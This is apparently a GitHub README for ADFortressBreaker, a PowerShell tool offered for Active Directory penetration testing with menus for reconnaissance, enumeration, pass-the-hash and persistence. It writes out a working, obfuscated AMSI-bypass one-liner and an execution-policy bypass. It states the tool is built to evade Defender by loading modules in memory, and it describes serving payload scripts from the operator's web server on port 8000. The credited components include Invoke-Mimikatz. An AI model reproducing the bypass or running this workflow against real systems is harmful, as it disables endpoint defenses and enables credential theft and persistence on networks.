<h1 align=center> ADFortressBreaker </h1>

![Default_fortress_breaker_logo_microsoft_windows_cybersecurity_1_b2db1a2f-aaee-41f3-85a0-d73527e5ce6e_0](https://github.com/m4rkh4ck/ADFortressBreaker/assets/92309458/08f54524-3a96-41a0-b294-da0514c611fd)

<h1 align=center><br><img src= https://img.shields.io/badge/Language-Powershell-blue> <img src= https://img.shields.io/badge/Version-v1.0-green> <a href= "https://www.linkedin.com/in/%F0%9F%92%BE-diego-marcaccio-06431970/"><img src= https://img.shields.io/badge/Follow-m4rkh4ck-black> <a href= "https://www.linkedin.com/in/antonio-migliuolo-723598207/"><img src= https://img.shields.io/badge/Follow-synackid-white></h1>

## About ADFortressBreaker
The script has been written to help Ethical Hackers to execute the most common command in a Penetration Test in Active Directory environment without write any line of code.
It's written to leave as few traces as possible, so all the module will be loaded directly in memory to avoid defender interception.

## Usage
Before launching AdFortressBreaker it is necessary to bypass powershell execution policy:
```
powershell -ep bypass
```
Then you have to bypass the AMSI control:
```
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

Import the module:
```
. .\ADFortressBreaker.ps1
```

Execute:
```
Invoke-ADFortressBreaker
```

After that the user have to start a web server on port 8000 on his machine.



```
           _____  ______         _                     ____                 _
     /\   |  __ \|  ____|       | |                   |  _ \               | |
    /  \  | |  | | |__ ___  _ __| |_ _ __ ___  ___ ___| |_) |_ __ ___  __ _| | _____ _ __
   / /\ \ | |  | |  __/ _ \| '__| __| '__/ _ \/ __/ __|  _ <| '__/ _ \/ _ | |/ / _ \ '__|
  / ____ \| |__| | | | (_) | |  | |_| | |  __/\__ \__ \ |_) | | |  __/ (_| |   <  __/ |
 /_/    \_\_____/|_|  \___/|_|   \__|_|  \___||___/___/____/|_|  \___|\__,_|_|\_\___|_|


1) Reconnaissance
2) Enumeration
3) PassTheHash
4) Persistence
5) Exit


[*] Start a web server on your machine (exposed on port 8000) to download the .ps1 file

[*} Example: python3 -m http.server

[*] Set the web server ip address :

```

In the main menu the user can choose the activity to do simply by typing the corresponding number and pressing enter.

## Credits
To implement ADFortressBreaker we used the following tools: <br>
- <a href= "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">Powerview.ps1</a> <br>
- <a href= "https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">PowerUp.ps1</a> <br>
- <a href= "https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">SharpHound.ps1</a><br> 
- <a href= "https://github.com/HarmJ0y/ASREPRoast/blob/master/ASREPRoast.ps1">ASREPRoast.ps1</a><br>
- <a href= "https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz.ps1</a><br> 
